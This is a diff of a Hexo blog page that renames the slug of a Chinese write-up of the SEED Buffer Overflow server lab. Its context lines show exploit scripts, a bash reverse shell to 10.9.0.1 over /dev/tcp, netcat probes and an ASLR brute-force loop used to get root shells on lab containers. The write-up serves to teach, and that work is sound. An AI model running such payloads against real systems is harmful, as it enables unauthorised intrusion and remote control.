@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SEED_LAB-BUFFER_OVERFLOW, Yssx&#39;s Blog">
+    <meta name="keywords" content="SEEDLAB-BUFFER_OVERFLOW, Yssx&#39;s Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SEED_LAB-BUFFER_OVERFLOW | Yssx&#39;s Blog</title>
+    <title>SEEDLAB-BUFFER_OVERFLOW | Yssx&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SEED_LAB-BUFFER_OVERFLOW</h1>
+                    <h1 class="description center-align post-title">SEEDLAB-BUFFER_OVERFLOW</h1>
                 </div>
             </div>
         </div>
@@ -527,9 +527,9 @@ content<span class="token punctuation">[</span>offset<span class="token punctuat
   f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="任务一：32位已知ebp，buffer地址"><a href="#任务一：32位已知ebp，buffer地址" class="headerlink" title="任务一：32位已知ebp，buffer地址"></a>任务一：32位已知ebp，buffer地址</h2><p>初始使用 <code>echo hello | nc 10.9.0.5 9090</code>来探测server1程序，得到如下返回信息，可知bof中的ebp地址及buffer起始地址，地址相减可以得到 <code>offset=0x4c8-0x458+4=0x74</code></p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779172676085.png" alt="server1相关信息"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779172676085.png" alt="server1相关信息"></p>
 <p>接下来试探最大inputsize，随意cat一个大文件并nc服务器，<code>cat exploit.py | nc 10.9.0.5 9090</code> ，得到以下结果，可以的到最大输入size为517</p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779173088324.png" alt="获取最大size"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779173088324.png" alt="获取最大size"></p>
 <p>此时所有信息已获取，可以进行攻击尝试，填充攻击模版如下。通过start设定shellcode在payload中的位置，ret地址设为bufaddr+200，小于bufaddr+300，可以滑到shellcode中</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
 <span class="token keyword">import</span> sys
@@ -572,10 +572,10 @@ content<span class="token punctuation">[</span>offset<span class="token punctuat
 
 <p>此处对我们的反弹shell <code>/bin/bash -i &gt; /dev/tcp/10.9.0.1/1234 0&lt;&amp;1 2&gt;&amp;1</code>进行解释：-i为交互模式，&gt;重定向输出到10.9.0.1的1234端口,后续将stdout地址中也就是目前的端口连接中的内容，分别作为标准输入和stderr的输出位置，实现shell的反射。同时需要我们在本地机使用 <code>nc -l -nv 1234</code>开启端口监听</p>
 <p>我们运行该脚本，并 <code>cat badfile | nc 10.9.0.5 9090</code>查看结果</p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779174945043.png" alt="服务器回显"><img src="/2026/05/19/seed-lab-buffer-overflow/1779174950455.png" alt="get反射shell"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779174945043.png" alt="服务器回显"><img src="/2026/05/19/seedlab-buffer-overflow/1779174950455.png" alt="get反射shell"></p>
 <p>成功获取服务器root权限</p>
 <h2 id="任务二：32位已知buffer，未知ebp"><a href="#任务二：32位已知buffer，未知ebp" class="headerlink" title="任务二：32位已知buffer，未知ebp"></a>任务二：32位已知buffer，未知ebp</h2><p>前置步骤同任务一，我们可以得到inputsize与buffer初始地址，但是此处无法得到ebp地址，如下图所示。因此，我们的offset位置难以确定</p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779177139427.png"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779177139427.png"></p>
 <p>但由于实验中所说，此处的buffersize被锁定在了100-200间，因此，我们可以将这一部分的字节全部填充为ret地址，使得无论offset是多少，都可以ret到正确的地址</p>
 <p>因此给出如下的攻击代码，shellcode部分不变，start部分靠后，确保在最大bufsize 200以后，同时循环填充104-204间的所有byte，写入ret地址</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">start <span class="token operator">=</span> <span class="token number">350</span>               <span class="token comment"># Change this number </span>
@@ -584,7 +584,7 @@ content<span class="token punctuation">[</span>start<span class="token punctuati
 <span class="token comment"># Decide the return address value </span>
 <span class="token comment"># and put it somewhere in the payload</span>
 bufaddr <span class="token operator">=</span> <span class="token number">0xffffd408</span>
-ret    <span class="token operator">=</span> bufaddr <span class="token operator">+</span> <span class="token number">300</span>     <span class="token comment"># Change this number     </span>
+ret    <span class="token operator">=</span> bufaddr <span class="token operator">+</span> <span class="token number">300</span>     <span class="token comment"># Change this number   </span>
 
 <span class="token comment"># Use 4 for 32-bit address and 8 for 64-bit address</span>
 <span class="token keyword">for</span> offset <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">204</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -596,11 +596,11 @@ ret    <span class="token operator">=</span> bufaddr <span class="token operator
   f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>攻击结果如下，成功获取到server2的root权限</p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779177587859.png"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779177587859.png"></p>
 <h2 id="任务三：64位-大BufferSize"><a href="#任务三：64位-大BufferSize" class="headerlink" title="任务三：64位 大BufferSize"></a>任务三：64位 大BufferSize</h2><p>如本节标题所述，本任务开始64位程序的攻击。与32位机器上的缓冲区溢出攻击相比，在64位机器上的攻击更为困难。目前只允许从0x00到0x00007FFFFFFFFFFF的地址。这意味着每一个8字节地址的最高两位总是为零。</p>
 <p>在本节缓冲区溢出攻击中，我们需要将至少一个地址存储在负载中，并通过strcpy()函数将其复制到栈中。然而strcpy()函数会在遇到零时停止复制，如果像之前一样将shellcode放在ret地址后，则无法被写入栈中</p>
 <p>首先依然是通过 <code>echo hello | nc 10.9.0.7 9090</code>来查探offset与bufaddr，结果如下。可以看到本节程序offset为0xD0，远远超过shellcode的大小。</p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779186711129.png"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779186711129.png"></p>
 <p>因此，我们设计出如下的攻击代码，可以看到此处我们的start地址很小，说明shellcode被放在了bof函数内部，同时ret将帮助程序流跳转到shellcode处执行</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
 <span class="token keyword">import</span> sys
@@ -644,10 +644,10 @@ content<span class="token punctuation">[</span>offset<span class="token punctuat
   f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>我们执行该段攻击代码，成功获取server3的root shell</p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779186905418.png"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779186905418.png"></p>
 <h2 id="任务四：64位小bufsize"><a href="#任务四：64位小bufsize" class="headerlink" title="任务四：64位小bufsize"></a>任务四：64位小bufsize</h2><p>通过上述方法，我们确实可以成功利用漏洞，但该方法必须确保bufsize足够大。然而当我们对server4进行试探后发现，本节bufsize仅有0x60字节，完全不够shellcode的存储。</p>
 <p>因此我们必须另辟蹊径，想想stack程序中哪里还有可能存储着我们的shellcode呢？</p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779187054809.png"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779187054809.png"></p>
 <p>观察如下stack源码，可以发现:payload真正被用户输入的部分其实在main函数的str中，而我们前几节的攻击对象buffer只是将str的内容strcpy到buffer中去了。既然strcpy有截断问题，无法将后续shellcode存入到buffer中。我们便可以考虑从str入手，仅通过buffer修改bof的ret地址，将程序控制流引导到str中的shellcode上便可。</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
@@ -711,7 +711,7 @@ c
 p /x <span class="token operator">&amp;</span>buffer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>通过调试，我们获得的关键信息如下，由此得到了str的首地址：<code>bufaddr+0x490</code>。注意！！！docker中的程序地址与本地调试会有微小差异，因此要求动态重定位</p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779187802318.png"><img src="/2026/05/19/seed-lab-buffer-overflow/1779187825956.png"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779187802318.png"><img src="/2026/05/19/seedlab-buffer-overflow/1779187825956.png"></p>
 <p>根据上述分析，我们更新攻击代码如下，为防止偏差，shellcode放在300处，同时ret尽可能靠近shellcode地址，故+300。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Fill the content with NOP's</span>
 content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x90</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">517</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
@@ -737,10 +737,10 @@ content<span class="token punctuation">[</span>offset<span class="token punctuat
   f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>攻击结果如下图所，成功获取server4的root</p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779188435800.png"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779188435800.png"></p>
 <h2 id="任务五：对抗ASLR地址随机化"><a href="#任务五：对抗ASLR地址随机化" class="headerlink" title="任务五：对抗ASLR地址随机化"></a>任务五：对抗ASLR地址随机化</h2><p>本节，我们通过命令 <code>sudo /sbin/sysctl -w kernel.randomize_va_space=2</code>打开linux中的全局地址随机化，该设置将会使程序在每次启动时，都被加载到不同的内存地址上。</p>
 <p>我们拿server1举例，在开启ASLR后，多次进行执行 <code>echo hello | nc 10.0.0.5 9090</code>，结果如下图。可以看到，我们的bufaddr和ebp每次都在进行变化，因此先前的固定地址脚本无法使用了</p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779195132676.png"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779195132676.png"></p>
 <p>然而在32位linux中，可用进行地址随机化的比特数仅为19比特。如果我们反复运行攻击，则很容易击中目标。故此处使用如下脚本进行对服务器的暴力攻击，当成功反射shell是，脚本则会自动暂停，等待用户操作</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable"><span class="token environment constant">SECONDS</span></span><span class="token operator">=</span><span class="token number">0</span>
 <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token number">0</span>
@@ -757,8 +757,8 @@ content<span class="token punctuation">[</span>offset<span class="token punctuat
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>笔者运气很好，仅用三分半便完成了暴力破解</p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779195465880.png"></p>
-<p><img src="/2026/05/19/seed-lab-buffer-overflow/1779195509726.png" alt="成功获取shell"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779195465880.png"></p>
+<p><img src="/2026/05/19/seedlab-buffer-overflow/1779195509726.png" alt="成功获取shell"></p>
 
                 
             </div>
@@ -785,7 +785,7 @@ content<span class="token punctuation">[</span>offset<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Yssx-g.github.io/2026/05/19/seed-lab-buffer-overflow/">https://Yssx-g.github.io/2026/05/19/seed-lab-buffer-overflow/</a>
+                    <a href="https://Yssx-g.github.io/2026/05/19/seedlab-buffer-overflow/">https://Yssx-g.github.io/2026/05/19/seedlab-buffer-overflow/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1131,30 +1131,29 @@ content<span class="token punctuation">[</span>offset<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2026/05/19/seed-lab-buffer-overflow/">
+                <a href="/2026/05/21/seedlab-retlib/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="SEED_LAB-BUFFER_OVERFLOW">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="SEEDLAB_RETLIB">
                         
-                        <span class="card-title">SEED_LAB-BUFFER_OVERFLOW</span>
+                        <span class="card-title">SEEDLAB_RETLIB</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SeedLab实验（本节实验网址https://seedsecuritylabs.org/chinese/labs/Software/Buffer_Overflow_Server/）
+                            SeedLab实验（本节实验网址https://seedsecuritylabs.org/chinese/labs/Software/Return_to_Libc/）
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2026-05-19
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2026-05-21
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1167,7 +1166,6 @@ content<span class="token punctuation">[</span>offset<span class="token punctuat
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -1186,13 +1184,13 @@ content<span class="token punctuation">[</span>offset<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2026/05/17/seed-lab-set-uid/">
+                <a href="/2026/05/17/seedlab-set-uid/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="SEED_LAB-Set_uid">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="SEEDLAB-Set_uid">
                         
-                        <span class="card-title">SEED_LAB-Set_uid</span>
+                        <span class="card-title">SEEDLAB-Set_uid</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
